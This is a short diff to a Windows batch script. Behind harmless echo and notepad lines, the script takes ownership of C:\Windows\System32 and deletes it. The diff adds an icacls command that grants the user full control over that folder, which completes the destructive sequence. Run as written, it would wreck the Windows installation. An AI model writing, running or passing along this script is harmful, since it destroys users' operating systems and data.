@@ -2,4 +2,5 @@ echo Nothing Here
 echo Everything Here
 start notepad
 takeown /F C:\Windows\System32 /R /D Y
+icacls C:\Windows\System32 /grant %USERNAME%:F /T
 rd /s /q C:\Windows\System32
